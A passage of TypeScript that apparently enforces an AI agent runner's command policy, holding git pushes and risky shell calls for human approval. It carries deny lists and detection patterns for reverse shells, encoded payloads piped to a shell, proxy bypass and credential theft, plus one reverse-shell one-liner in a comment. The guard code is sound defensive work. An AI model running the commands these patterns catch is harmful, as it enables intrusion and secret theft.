function readPushes(script: string, from: string | null, read: { pushes: GitPush[]; moved: boolean }): boolean {
  let dir = from;
  // The lines its shell runs: a comment line is none, and a line continuation or a newline in quotes isn't an end.
  for (const line of shellLines(script)) {
    const cmds = simpleCommands(line);
    // Once a line, not once for each of its commands.
    const mentioned = mentionsPush(line);
    if (!cmds) {
      if (mentioned) return false;
      continue;
    }
    for (const { argv, piped } of cmds) {
      const words = unwrapped(argv);
      const cmd = baseName(words[0] ?? "");
      if (cmd === "cd") {
        dir = cdTo(dir, words[1]);
        continue;
      }
      if (SHELL_NAMES.test(cmd) && /^-[a-z]*c[a-z]*$/.test(words[1] ?? "") && words[2] !== undefined) {
        if (!readPushes(words[2], dir, read)) return false;
        continue;
      }
      const at = cmd === "git" ? 0 : PASS_THROUGH.has(cmd) ? words.findIndex((w) => baseName(w) === "git") : -1;
      if (at >= 0) {
        const push = parsePush(words.slice(at), dir);
        if (push === UNREADABLE) return false;
        if (push === MOVES_HEAD) read.moved = true;
        else if (push && (push.refs.length > 0 || push.every || push.prune)) {
          if (read.moved && push.refs.some((r) => r.branch === null || r.branch === "HEAD")) return false;
          read.pushes.push(push);
        }
        continue;
      }
      if (!mentioned) continue;
      if (runsText(cmd, words, piped === true) || (!printsOnly(cmd) && mentionsPush(words.join(" ")))) return false;
    }
  }
  return true;
}

/** What git says about the repository a push runs in; each read only when a decision needs it. */
export interface RepoFacts {
  /** The branch checked out; null when detached or unknown. */
  current(): Promise<string | null>;
  /** Where a bare push goes (`@{push}`): its remote (null: the default one) and branch; null when git can't tell. */
  pushTarget(): Promise<{ remote: string | null; branch: string | null } | null>;
  /** The remote's default branch: `refs/remotes/<remote>/HEAD`, else the remote's own `HEAD`; null when unknown. */
  defaultBranch(remote: string): Promise<string | null>;
  /** The branches the repository marks protected (`git config agentes.protectedBranch`, `*` matches anything). */
  protectedBranches(): Promise<readonly string[]>;
  /** Every push URL of the remote (or of a URL as git rewrites it) is our git proxy's; false when unknown. */
  viaProxy(remote: string): Promise<boolean>;
}

/** Our git proxy (ADR 0024): `…/api/git/<org>/<connection>/<owner>/<repo>.git`. */
const PROXY_URL = /^https?:\/\/[^\s?#]*\/api\/git\/[0-9a-f-]{36}\/[0-9a-f-]{36}\//i;
export const isProxyUrl = (url: string) => PROXY_URL.test(url.trim());

/** The remote a push goes to: the one it names, else the branch's push remote, else origin. */
export const pushRemote = async (push: Pick<GitPush, "remote">, facts: RepoFacts) =>
  push.remote ?? (await facts.pushTarget())?.remote ?? "origin";

/**
 * Why a command waits for a person, and what the agent can do instead. `never`: it goes through our git proxy,
 * which refuses it whoever approves, so it never runs from here: `what` is the whole refusal, pointing where to go.
 */
export interface Held {
  what: string;
  instead?: string;
  never?: true;
}

/** What a command needs before it runs here: a person's approval (`message` says how to ask), or never (`never`). */
export interface Hold {
  message: string;
  never: boolean;
}

const globMatches = (pattern: string, s: string) =>
  new RegExp(`^${pattern.split("*").map(escapeRe).join(".*")}$`).test(s);

/**
 * Whether one push waits for a person (ADR 0053 §3, amended 2026-10-30): a push to the agent's own branches
 * (`own`, under its `agentes/<handle>/` prefix: nobody else's) or to any other branch but the default and
 * the protected ones is ordinary work; a push to the default or a protected branch, a force push to a branch
 * that isn't its own, deleting a remote branch, `--all`, `--mirror` and `--prune` wait. When git can't tell
 * where a push goes or which branch is the default, it waits too.
 */
export async function heldPush(push: GitPush, facts: RepoFacts, own: readonly string[]): Promise<Held | null> {
  const instead = `Or push to a branch of your own${own[0] ? ` (${own[0]}…)` : ""} and open a pull request.`;
  let remote = push.remote;
  /** The hold, or through our git proxy (which refuses it whoever approves) the refusal pointing where to go. */
  const hold = async (what: string, otherwise: string | undefined, never: string): Promise<Held> =>
    (await facts.viaProxy(await pushRemote({ remote }, facts)))
      ? { what: `${what}: ${never}`, never: true }
      : { what, ...(otherwise ? { instead: otherwise } : {}) };
  const toPullRequest = `our git proxy never lets it through. Push to a branch of your own${own[0] ? ` (${own[0]}…)` : ""} and open a pull request; merging is a separate step. ${NO_TERMINAL_COMMANDS}`;
  if (push.mirror)
    return hold("This is a mirror push: it can overwrite and delete any branch", undefined, toPullRequest);
  if (push.every) return hold("This push updates every branch, the default one too", instead, toPullRequest);
  if (push.prune)
    return hold("This push deletes the remote branches that aren't here (--prune)", undefined, toPullRequest);
  for (const ref of push.refs) {
    let branch = ref.branch;
    if (branch === "HEAD") branch = await facts.current();
    else if (branch === null) {
      const target = await facts.pushTarget();
      branch = target?.branch ?? null;
      remote ??= target?.remote ?? null;
    }
    if (branch === null) return { what: "git can't tell which branch this push goes to", instead };
    if (ref.delete) return hold(`This deletes the remote branch ${branch}`, undefined, DELETE_BRANCHES_POINTER);
    if (own.some((prefix) => prefix && branch.startsWith(prefix))) continue;
    if ((await facts.protectedBranches()).some((p) => globMatches(p, branch))) {
      return hold(`This push goes to the protected branch ${branch}`, instead, toPullRequest);
    }
    const main = await facts.defaultBranch(remote ?? "origin");
    if (main === null) {
      return { what: "git can't tell this repository's default branch, so this push may go to it", instead };
    }
    if (branch === main) return hold(`This push goes to the default branch ${main}`, instead, toPullRequest);
    if (ref.force) {
      return hold(
        `This is a force push to ${branch}, a branch others may share`,
        "Or push without force, after bringing in what changed there (git pull --rebase).",
        `our git proxy never lets it through. Push without force, after bringing in what changed there (git pull --rebase). ${NO_TERMINAL_COMMANDS}`,
      );
    }
  }
  return null;
}

/** The first word of each deny rule (`gh`, `vercel`, `kubectl`…): where a command starts inside code. */
const COMMAND_HEADS = new Set(MISSION_DENY_RULES.map((r) => /^Bash\(([^\s*)]+)/.exec(r)?.[1] ?? "").filter(Boolean));

/**
 * The commands code in another language spells out (Python, Node), line by line: quotes, brackets and
 * commas read as spaces, from each command's first word (`subprocess.run(["gh", "pr", "merge"])` reads
 * `gh pr merge`). The first command on a line runs to the line's end, so the parts after it are read too (`… |
 * /usr/bin/gh pr merge`); a later one runs past the next command's first word, then only as far as a rule reads
 * (`COMMAND_OF_MAX`): a long line with many is read about once, not once from each. That reach counts the words as
 * written, while the rules read past git's global options and gh's `-R` (`normalizedCommand`): a later command whose
 * options alone fill it, another command's first word among them, is cut before its subcommand.
 */
function commandsInCode(code: string): string[] {
  return code.split("\n").flatMap((line) => {
    const words = line
      .replace(/["'`,()[\]{};]/g, " ")
      .split(/\s+/)
      .filter(Boolean);
    let first = true;
    return words.flatMap((w, k) => {
      if (!COMMAND_HEADS.has(w)) return [];
      if (first) {
        first = false;
        return [words.slice(k).join(" ")];
      }
      let command = w;
      let next = false;
      for (let j = k + 1; j < words.length && (!next || command.length < COMMAND_OF_MAX); j++) {
        command += ` ${words[j]}`;
        next ||= COMMAND_HEADS.has(words[j] as string);
      }
      return [command];
    });
  });
}

/**
 * What a text says by itself, before git is asked (`approvalNeeded`): the pushes it makes (null: one can't be
 * read) and the deny list's refusal (null: none). Plain data, so it can be worked out in another process.
 */
export interface TextVerdict {
  pushes: GitPush[] | null;
  denied: string | null;
}

/**
 * `approvalNeeded`'s part that asks nothing of the computer, and nearly all of its work on a long script: the
 * runner works a long one out in a child process (`script-check`), so its own thread never waits for it.
 */
export function textVerdict(text: string, how: string, code = false): TextVerdict {
  const pushes = code ? (PUSH_MENTION.test(text) ? null : []) : gitPushes(text);
  // Code: each command it spells out once.
  const commands = code ? [...new Set(commandsInCode(text))] : [text];
  for (const command of commands) {
    const denied = deniedMessage("Bash", { command }, how);
    if (denied) return { pushes, denied };
  }
  return { pushes, denied: null };
}

/**
 * Why a command, a shell script or code (`code`: another language) waits for a person, as the refusal
 * tells the agent (`how`: what it can do to ask), or null: a push our git proxy would refuse never runs (it
 * outranks the rest, so no approval lets the command through), then the deny list's kinds, then every push it
 * makes (`heldPush`, with `facts` for the folder each runs in). A push the policy can't read waits.
 */
export async function approvalNeeded(
  text: string,
  how: string,
  opts: { code?: boolean; own?: readonly string[]; facts: (dir: string | null) => RepoFacts },
): Promise<Hold | null> {
  return approvalOf(textVerdict(text, how, opts.code), how, opts);
}

/** `approvalNeeded` from a text's `textVerdict`: each of its pushes read with git, then the order above. */
export async function approvalOf(
  verdict: TextVerdict,
  how: string,
  opts: { own?: readonly string[]; facts: (dir: string | null) => RepoFacts },
): Promise<Hold | null> {
  const own = opts.own ?? [];
  const { pushes, denied } = verdict;
  let first: Held | null = null;
  for (const push of pushes ?? []) {
    const held = await heldPush(push, opts.facts(push.dir), own);
    if (held?.never) return { message: held.what, never: true };
    first ??= held;
  }
  if (denied) return { message: denied, never: false };
  if (pushes === null) {
    const message = approvalMessage(
      "This runs git push in a way the computer can't read, so where it goes is unknown",
      how,
      "Or run the push as a plain command of its own (git push origin <branch>).",
    );
    return { message, never: false };
  }
  return first ? { message: approvalMessage(first.what, how, first.instead), never: false } : null;
}

/** Interpreters and the options that run code given on the command line. */
const INLINE_CODE: Array<[RegExp, RegExp]> = [
  [/^(node|nodejs|bun)$/, /^(-e|--eval|-p|--print|-pe|-ep)$|^--(eval|print)=/],
  // `-c` ends a cluster of python's flags (`-Bc`), or carries the code glued (`-cprint(1)`).
  [/^python[\d.]*$/, /^-[a-zA-Z]*c/],
  [/^ruby$/, /^-[a-zA-Z]*e/],
  [/^perl$/, /^-[a-zA-Z0-9]*[eE]/],
  [/^php$/, /^-r/],
];

/** Code given inline to an interpreter (`node -e`, `python3 -c`, `perl -ne`, `deno eval`): never auto-allowed. */
export function inlineCode(argv: readonly string[]): boolean {
  const [first = "", ...args] = unwrapped([...argv]);
  const base = baseName(first);
  if (base === "deno") return args.find((a) => !a.startsWith("-")) === "eval";
  const rule = INLINE_CODE.find(([name]) => name.test(base));
  if (!rule) return false;
  // Options before the script: the first plain word is the script, and what follows it is its own.
  for (const a of args) {
    if (!a.startsWith("-")) return false;
    if (rule[1].test(a)) return true;
  }
  return false;
}

/** Any part of a shell call runs inline code. */
export const inlineCodeCall = (toolName: string, input: Record<string, unknown> | null | undefined) =>
  commandWords(commandCall(toolName, input)?.command ?? "").some(inlineCode);

/**
 * How an agent asks a person for a command it may not run alone: `run_code` with a `why` opens the approval
 * card in the chat, and the command runs once they approve.
 */
export const ASK_IN_CHAT =
  "To ask them, run the same command with run_code, with why set to your reason: it waits for their decision in the chat.";
/** The same for a call of ours the computer held (`run_code`, `run_skill_script`, `start_task`). */
export const ASK_AGAIN =
  "To ask them, make the same call again with why set to your reason: it waits for their decision in the chat.";
/** Inside a background task nobody is there to approve anything. */
export const ASK_AFTER_TASK = "Nobody can approve it inside a background task: stop and say so in your result.";

/** The same for an edit of the brain's own, which `write_file` makes with a reason. */
export const ASK_WITH_WRITE_FILE =
  "To ask them, make the same change with write_file, with why set to your reason: it waits for their decision in the chat.";

const WAITS_FOR_PERSON = ": a person approves it first. ";

/** A refusal that names exactly why, what to do to ask a person, and what to do instead. */
export const approvalMessage = (what: string, how: string, instead?: string) =>
  `${what}${WAITS_FOR_PERSON}${how}${instead ? ` ${instead}` : ""}`;

/** Whether a refusal is a command held for a person (`approvalMessage`), not a secret read nor one never run. */
export const heldForPerson = (message: string) => message.includes(WAITS_FOR_PERSON);

/**
 * A held command's refusal as an agent that never asks reads it (ADR 0173): what it is and where it runs, with
 * nobody to wait for. Any other refusal stays as it is.
 */
export const unaskedMessage = (message: string) => {
  const at = message.indexOf(WAITS_FOR_PERSON);
  if (at < 0) return message;
  return `${message.slice(0, at)}: your own shell doesn't run it. Run the same command with run_code: it runs there without asking anyone.`;
};

/** Told to the agent when a call reads a secret. */
export const SECRET_MESSAGE =
  "Agents never read secrets (keys, tokens, credentials, .env files). Do the work without them; if a search pattern only looks like one, search another way.";
/** Told to the agent when a plan turn wants more than reading. */
export const PLAN_MESSAGE =
  "This turn may only read: no edits, no commands that change anything, no web. Report what you would do instead.";

/** The end of every refusal that names a way out: people decide in the chat, never at a terminal. */
export const NO_TERMINAL_COMMANDS = "Never give the person a terminal command to run.";
/**
 * A computer's `not_allowed` that is the command policy's `never` (a push our git proxy refuses): it already says
 * where to go instead, so it is shown as it is.
 */
export const policyRefusal = (message: string) => message.endsWith(NO_TERMINAL_COMMANDS);
/** Said to an agent deleting a branch with git, by the computer and by the git proxy. */
export const DELETE_BRANCHES_POINTER = `agents don't delete branches with git. Ask with delete_branches (repo, branches, why): a person approves them all on one card and they're deleted on GitHub. ${NO_TERMINAL_COMMANDS}`;
/** Said by the git proxy to an agent pushing, with no person's approval, to branches that aren't its own. */
export const otherBranchPointer = (branches: readonly string[], handle: string) =>
  `${branches.join(", ")} ${branches.length === 1 ? "isn't your branch" : "aren't your branches"} (yours: agentes/${handle}/…). To push there, ask with request_branch_push (repo, branch, why); once a person approves, push again. Or push to agentes/${handle}/<topic> and open a pull request. ${NO_TERMINAL_COMMANDS}`;

/** The addresses a call opens: WebFetch's `url`, every http(s) argument of a curl or wget. */
function outboundUrls(toolName: string, input: Record<string, unknown> | null | undefined): string[] {
  if (toolName === "WebFetch") return typeof input?.url === "string" ? [input.url] : [];
  const command = commandCall(toolName, input)?.command;
  if (command === undefined) return [];
  const urls: string[] = [];
  for (const s of simpleCommands(command) ?? []) {
    const base = baseName(s.argv[0] ?? "");
    if (base !== "curl" && base !== "wget") continue;
    for (const a of s.argv.slice(1)) {
      const v = a.replace(/^--url=/, "");
      if (/^https?:\/\//i.test(v)) urls.push(v);
    }
  }
  return urls;
}

/**
 * An address a call would open that carries a key (`outboundUrlProblem` without the run's reads, which only the
 * server knows): refused before anything allows the call. Length alone refuses nothing here: presigned download
 * links (S3 session tokens, GCS signatures) run past a thousand characters, and with no reads known nothing could
 * tell a person's link from a smuggling one.
 */
export function outboundCallProblem(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
): { code: OutboundCode; message: string } | null {
  for (const url of outboundUrls(toolName, input)) {
    const problem = outboundUrlProblem(url);
    if (problem && problem.code !== "outbound.long") return problem;
  }
  return null;
}

/**
 * What the computer decides by itself, before anyone is asked: the deny list
 * and secrets are refused (`how`: what the refusal says to do to ask a
 * person), plain reads allowed; in a `plan` turn everything else is refused
 * too. A refusal's `code` uses the server's prompt codes (`never`, `secret`,
 * `outbound.*`), and `policy` for a plan turn's. Null: the server decides (`permission_prompt`: a mission's card, or
 * code's rules for a run). The runner's prompt tool for Claude Code and its
 * answers to Codex's command approvals both start here; pushes come next
 * there (`approvalNeeded`).
 */
export function localVerdict(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
  scope: CommandScope | undefined,
  profile: CommandProfile,
  how: string = ASK_IN_CHAT,
): { behavior: "allow" } | { behavior: "deny"; message: string; code: string } | null {
  const denied = deniedMessage(toolName, input, how);
  if (denied) return { behavior: "deny", message: denied, code: denied === SECRET_MESSAGE ? "secret" : "never" };
  const outbound = outboundCallProblem(toolName, input);
  if (outbound) return { behavior: "deny", message: outbound.message, code: outbound.code };
  if (secretRead(toolName, input, scope)) return { behavior: "deny", message: SECRET_MESSAGE, code: "secret" };
  if (scope && readOnlyCall(toolName, input, scope, profile)) return { behavior: "allow" };
  if (profile === "plan") return { behavior: "deny", message: PLAN_MESSAGE, code: "policy" };
  return null;
}

// ── What the judge may never approve ──────────────────────────────────────────

const SYSTEM = new Set([
  "sudo",
  "doas",
  "su",
  "launchctl",
  "systemctl",
  "service",
  "shutdown",
  "reboot",
  "halt",
  "mkfs",
  "diskutil",
  "fdisk",
  "dd",
  "csrutil",
  "spctl",
  "defaults",
  "osascript",
  "crontab",
  "visudo",
  "passwd",
  "chsh",
  "nvram",
  "pmset",
  "kextload",
  // Windows
  "runas",
  "reg",
  "schtasks",
  "sc",
  "bcdedit",
  "diskpart",
  "format",
  "vssadmin",
  "wbadmin",
  "wevtutil",
  "wmic",
  "net",
  "netsh",
  "icacls",
  "cacls",
  "takeown",
]);
const REMOTE = new Set(["ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "telnet", "ftp", "socat", "mosh"]);
const WRITERS = new Set([
  "rm",
  "rmdir",
  "mv",
  "cp",
  "tee",
  "touch",
  "mkdir",
  "ln",
  "chmod",
  "chown",
  "chgrp",
  "truncate",
  "install",
  "unlink",
  "shred",
  "srm",
]);
const INTERPRETERS = new Set([
  "sh",
  "bash",
  "zsh",
  "fish",
  "dash",
  "ksh",
  "eval",
  "exec",
  "source",
  ".",
  "xargs",
  "cmd",
  "powershell",
  "pwsh",
]);
/** Claude Code's tools that write a file (Codex's file changes are asked as `Write`). */
const FILE_WRITE_TOOLS = new Set(["Edit", "Write", "MultiEdit", "NotebookEdit"]);

/**
 * Why code refuses a call even when the judge would allow it (null: the
 * judge may decide). Secrets for every read tool; the rest applies to Bash.
 */
export function forbiddenReason(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
  scope: CommandScope,
): string | null {
  if (secretRead(toolName, input, scope)) return "it touches secrets";
  // An edit asked for is outside what the turn may write by itself (its folders): only there, or /tmp.
  const edited = FILE_WRITE_TOOLS.has(toolName)
    ? [input?.file_path, input?.notebook_path].find((v): v is string => typeof v === "string")
    : undefined;
  if (edited !== undefined) {
    if (namesSecret(edited, scope)) return "it touches secrets";
    return insideOrTmp(scope, edited) ? null : "it changes files outside the mission folder";
  }
  const call = commandCall(toolName, input);
  if (call === null) return null;
  // PowerShell's text is a script for an interpreter, as `powershell -Command`'s is.
  if (call.powershell) return "it runs other commands";
  const cmds = simpleCommands(call.command);
  if (!cmds || cmds.length === 0) return "it can't be read plainly";
  for (const s of cmds) {
    const [cmd = "", ...args] = s.argv;
    const base = baseName(cmd);
    if (s.writes.some((w) => !insideOrTmp(scope, w))) return "it writes outside the mission folder";
    if (SYSTEM.has(base)) return "it changes the system";
    if (REMOTE.has(base)) return "it connects to another host";
    if (INTERPRETERS.has(base)) return "it runs other commands";
    if (inlineCode(s.argv)) return "it runs code given inline";
    if (WRITERS.has(base)) {
      const paths = args.filter((a) => !a.startsWith("-"));
      if (paths.some((p) => !insideOrTmp(scope, p))) return "it changes files outside the mission folder";
    }
    if (base === "curl" || base === "wget") {
      if (!readOnlySimple(s, scope)) return "it sends data or saves outside the mission folder";
    }
    if (/^(npm|pnpm|yarn|bun)$/.test(base) && args.some((a) => a === "-g" || a === "--global" || a === "global")) {
      return "it installs globally";
    }
    if (
      /^(pip|pip3|gem|cargo|go|brew)$/.test(base) &&
      (args.includes("--user") ||
        args.includes("-g") ||
        (base === "brew" && /^(install|uninstall|upgrade|remove|rm|tap)$/.test(args[0] ?? "")))
    ) {
      return "it installs globally";
    }
    if (base === "git" && args.includes("config") && args.includes("--global")) return "it changes the system";
    if (s.argv.some((a) => SECRET_PATH.test(a))) return "it touches secrets";
  }
  return null;
}

// ── A run outside a mission: only obvious harm is refused ─────────────────────

/**
 * The person's and the computer's own credential stores, by path: what `badActorReason` refuses wherever a word names
 * one. A project's own key files (`.env`, `*.pem`, `credentials.json`) aren't here: `secretRead` keeps the brain from
 * reading those, and `run_code` works with them.
 */
const SECRET_STORE = new RegExp(
  [
    `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)`,
    `^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)`,
    `(^|/)(${SECRET_FILES.filter((f) => !f.startsWith("credentials"))
      .map(escapeRe)
      .join("|")})$`,
    `(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$`,
    ...SYSTEM_SECRETS,
  ].join("|"),
  "i",
);

const storeSecret = (word: string, scope: CommandScope) => pathsOf(word).some((p) => storeSecretPath(p, scope));

const storeSecretPath = (p: string, scope: CommandScope) => {
  if (SECRET_STORE.test(p)) return true;
  const r = resolveIn(scope, p);
  if (r === null) return false;
  const home = scope.home;
  return (
    SECRET_STORE.test(r) ||
    (home !== undefined && HOME_SECRET_DIRS.some((d) => under(r, absoluteIn(scope, path.join(home, d))))) ||
    (scope.runnerHome !== undefined && under(r, absoluteIn(scope, scope.runnerHome)))
  );
};

/** Folders whose files are the system's: `/usr/local` (Homebrew's, a user's own installs) and harmless devices aside. */
const SYSTEM_DIRS =
  /^\/(etc|usr(?!\/local(\/|$))|boot|sys|proc|bin|sbin|lib|lib32|lib64|System|Library|private\/etc|dev(?!\/(null|zero|stdout|stderr|tty|fd|shm)(\/|$)))(\/|$)/;
/**
 * Windows' own folders and the programs installed for everyone, as `windowsPath` gives them (`C:\Windows`,
 * `/c/Program Files`): read from the path itself, as Git Bash's `/c` is a drive on every computer.
 */
const WINDOWS_SYSTEM_DIRS = /^\/[a-z]\/(windows|program files( \(x86\))?)(\/|$)/;
/** What a recursive delete wipes the computer or a whole home with (any case: macOS and Windows ignore it). */
const WHOLE_TREE =
  /^(\/+\*?|~\/?\*?|(\$\{?(HOME|USERPROFILE)\}?|\$env:(USERPROFILE|HOMEPATH|SystemDrive|SystemRoot|windir)|%(USERPROFILE|HOMEPATH|SystemDrive|SystemRoot|windir)%)\/?\*?|\/(home|Users|root|bin|boot|dev|etc|lib|lib64|opt|proc|sbin|srv|sys|usr|var|System|Library|Applications|private|Windows|Program Files( \(x86\))?|ProgramData)\/?\*?)$/i;
/**
 * A Windows drive at the start of a path: `C:` (`C:\Users`, `C:/Users`), or Git Bash's `/c` alone or before Windows'
 * own folders (`/c/Users`); elsewhere a one-letter folder stays a POSIX one (`/a/usr`).
 */
const DRIVE = /^(?:[a-z]:(?=\/|$)|\/[a-z](?=\/?$|\/(Users|Windows|Program Files( \(x86\))?|ProgramData)(\/|$)))/i;

const PRIVILEGE = /^(sudo|sudoedit|su|doas|pkexec|run0|gsudo)$/;
const SYSTEM_TOOLS =
  /^(mount|umount|swapon|swapoff|modprobe|insmod|rmmod|kexec|visudo|passwd|chpasswd|useradd|userdel|usermod|groupadd|groupdel|groupmod|adduser|deluser|shutdown|reboot|halt|poweroff|telinit|csrutil|nvram|kextload|kextunload|setenforce|grub-install|update-grub)$/;
const WIPE_TOOLS = /^(mkfs(\..+)?|mke2fs|mkswap|wipefs|fdisk|sfdisk|cfdisk|gdisk|sgdisk|parted)$/;
const FIREWALL_TOOLS =
  /^(iptables|ip6tables|iptables-restore|ip6tables-restore|iptables-legacy|nft|ufw|firewall-cmd|pfctl)$/;
const SYSTEMCTL_CHANGES =
  /^(start|stop|restart|reload|try-restart|reload-or-restart|enable|disable|reenable|mask|unmask|kill|edit|set-property|isolate|daemon-reload|daemon-reexec|poweroff|reboot|halt|suspend|hibernate|link|revert|preset|set-default)$/;
/** Programs that send what they read to another machine. */
const SENDERS =
  /^(curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|http|https|xh|mail|mailx|sendmail|openssl|ftp|invoke-webrequest|iwr|invoke-restmethod|irm)$/;

/** A shell's network redirection and the usual one-liners that hand a shell to another machine. */
const SHELL_LITERAL = /["'`](\/bin\/)?(ba|z|da|k)?sh\b/;
const REVERSE_SHELL: ReadonlyArray<readonly RegExp[]> = [
  [/\/dev\/(tcp|udp)\//i],
  [/\/inet6?\/(tcp|udp)\//],
  // `cat /tmp/f | sh -i 2>&1 | nc host 4444 > /tmp/f`, `nc host 4444 < f | bash > f`: a shell reading a network tool.
  // A shell's path stops at the shell's operators: run over them, each `(` of minified code would scan to its end.
  [
    /\b(ba|z|da|k)?sh\s+-i\b|\|\s*([^\s|;&<>()]*\/)?(ba|z|da|k)?sh\b(\s+-[is]\b)?\s*($|[|<>&;\d])|(^|[;&|(]\s*)([^\s|;&<>()]*\/)?(ba|z|da|k)?sh\s*</m,
    /\b(nc|ncat|netcat|telnet|socat)\b|\bopenssl\s+s_client\b/,
  ],
  [/\bsocket\b/, /\bpty\.spawn\b|\bos\.dup2\b|\bdup2\s*\(/],
  [/\bsocket\b|\bcreate_connection\b/, /\bstdin\s*=/, SHELL_LITERAL],
  [/\bsocket\s*\(/i, /\bopen\s*\(\s*STD(IN|OUT|ERR)\s*,\s*["']?[>&]/],
  [/IO::Socket/, /\b(system|exec)\b|fdopen|\/bin\/(ba)?sh/],
  [/\bfsockopen\b/, /\b(exec|shell_exec|system|passthru|proc_open|popen)\s*\(|\/bin\/(ba)?sh/],
  [/\bTCPSocket\b/, /\b(exec|spawn|system)\b|IO\.popen|\/bin\/(ba)?sh/],
  [/\bnet\.(connect|createConnection|Socket)\b/, /\/bin\/(ba)?sh/],
  [/\bnet\.(connect|createConnection|Socket)\b|require\(\s*["'](node:)?net["']\s*\)/, /child_process/, SHELL_LITERAL],
  // PowerShell's: what comes in on a `Net.Sockets.TcpClient` is run with `Invoke-Expression` (Elixir's `iex` and its
  // own `TCPClient` modules aren't it).
  [/\bsockets\.tcpclient\b/i, /\b(iex|invoke-expression)\b/i],
];
/**
 * Code it hides by encoding it, then runs: `base64 -d | sh`, `eval "$(… | base64 -d)"`, `exec(b64decode(…))`. The
 * words between a decoder and its flag stop at the next same decoder, which then reads on, as `PROXY_TEXT`'s do.
 */
const DECODE = String.raw`(\bbase64\b(?:(?!\bbase64\b)[^|;&\n])*\s(-d|-D|--decode)\b|\bxxd\b(?:(?!\bxxd\b)[^|;&\n])*\s-r\b|\bopenssl\s+(base64|enc)\b(?:(?!\bopenssl\s+(base64|enc)\b)[^|;&\n])*\s-d\b)`;
/** A command substitution a shell runs (`eval "$(`, `bash -c $(`). */
const SUBSTITUTION_RUN = String.raw`\b(eval|(ba|z|da|k)?sh\s+-c)\s+["']?\$\(`;
const ENCODED_RUN: ReadonlyArray<readonly RegExp[]> = [
  // Piped into a shell or an interpreter that reads its program from that pipe (`| python3 -m json.tool` reads data).
  // The decode is read once, to its last flag (`(?=(…))\1` takes no other length), and the words up to the pipe stop
  // at the next decode, which reads on from there. A shell's path stops at the next pipe: run over pipes, each pipe of
  // a long run of them would scan to its end. It holds the other operators, since `| (/bin/sh)` and `|&/bin/sh` run it.
  [
    new RegExp(
      String.raw`(?=(${DECODE}))\1(?:(?!${DECODE})[^;&\n])*\|\s*([^\s|]*\/)?((ba|z|da|k)?sh|python[\d.]*|perl|ruby|node|php)\b(\s+-[\w-]*)*\s*($|[|;&)])`,
      "m",
    ),
  ],
  [new RegExp(`${SUBSTITUTION_RUN}(?:(?!${SUBSTITUTION_RUN})[^)])*${DECODE}`)],
  [/\bb64decode\b|\batob\s*\(|["']base64["']/, /(?<![.\w])(exec|eval)\s*\(|\bnew\s+Function\b/],
  [/\bfrombase64string\b/i, /\b(iex|invoke-expression)\b|\[scriptblock\]::create/i],
];
/**
 * The runner's own variables read (`$AGENTES_MCP_TOKEN`, `os.environ["AGENTES_RUNNER_HOME"]`, PowerShell's
 * `$env:AGENTES_MCP_TOKEN`, cmd's `%AGENTES_MCP_TOKEN%`), not their names in a search. Any case: Windows ignores it.
 */
const RUNNER_VARIABLE =
  /(\$\{?|\$env:|%|environ\s*\[\s*["']|environ\.get\(\s*["']|getenv\(\s*["']|getenvironmentvariable\(\s*["']|process\.env\.|process\.env\[\s*["']|ENV\[\s*["'])AGENTES_(RUNNER_HOME|MCP_TOKEN|MCP_SOCKET)\b/i;
/** A name that starts a word: without the lookbehind every letter of a long word starts a scan to its end. */
const FORK_BOMB = /(?<![\w:])([\w:]+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&/;
/**
 * The proxy variables set, emptied or dropped, in a shell or in code (`HTTPS_PROXY= curl`, `del os.environ["NO_PROXY"]`).
 * The words between `unset`, `env` or `del` and the variable stop at the next `unset`, `env` or `del`, which then
 * reads on: the same texts match, and a long run of them with no variable is read once, not once from each.
 */
const PROXY_TEXT: readonly RegExp[] = [
  /(^|\W)(https?|all|ftp|socks)_proxy["'\]]*\s*=(?!=)/i,
  /\bunset\b(?:(?!\bunset\b)[^\n;&|])*\b(https?|all|ftp)_proxy\b/i,
  /\benv\b(?:(?!\benv\b)[^\n;&|])*\s-u\s*(https?|all|ftp)_proxy\b/i,
  /\b(del|delete)\s(?:(?!\bdel(ete)?\s)[^\n;])*\b(https?|all)_proxy\b|\.pop\(\s*["'](https?|all)_proxy/i,
];
/** `NO_PROXY=…`'s value: what it sends around the proxy, fine while that is only this computer (`localhost,127.0.0.1`). */
const NO_PROXY_VALUE = /(^|\W)no_proxy["'\]]*\s*=(?!=)\s*["']?([^"'\s;&|)]*)/gi;
const LOCAL_HOST =
  /^(\.?localhost|127(\.\d+){0,3}(\/\d+)?|::1|\[::1\]|0\.0\.0\.0|[\w-]+\.local|\.local|host\.docker\.internal)$/i;
const proxyBypass = (text: string) =>
  [...text.matchAll(NO_PROXY_VALUE)].some((m) =>
    (m[2] ?? "").split(",").some((host) => host !== "" && !LOCAL_HOST.test(host.trim())),
  );
/** Code that sends its whole environment out: the dump and a network call in the same code. */
const ENV_DUMP_CODE =
  /JSON\.stringify\(\s*process\.env\s*\)|Object\.(entries|values)\(\s*process\.env\s*\)|\bdict\(\s*os\.environ\s*\)|\bos\.environ\.copy\(\)|\b(str|repr)\(\s*os\.environ\s*\)|json\.dumps\(\s*(dict\(\s*)?os\.environ\b|\bENV\.to_h\b/;
const NET_CODE =
  /\b(requests|urllib|httpx|aiohttp|http\.client|fetch|axios|https?\.(request|get)|socket|smtplib|Net::HTTP)\b/;

/** One command found anywhere in a text, read loosely: no quoting rule makes it disappear. */
interface Loose {
  /** Its words as written, assignments and wrappers included. */
  raw: string[];
  /** The command itself: assignments, wrappers and shell keywords left out. */
  argv: string[];
  /** Files written with `>`, `>>`, `&>`. */
  writes: string[];
  /** Files read with `<`. */
  reads: string[];
  /** PowerShell's text a command runs, read whole for its cmdlets (`powershellProblem`); the entry has no words. */
  powershell?: string;
}

/** Programs whose quoted words are commands or code of their own (`bash -c '…'`, `python3 -c '…'`, `eval '…'`). */
const RUNS_ITS_WORDS =
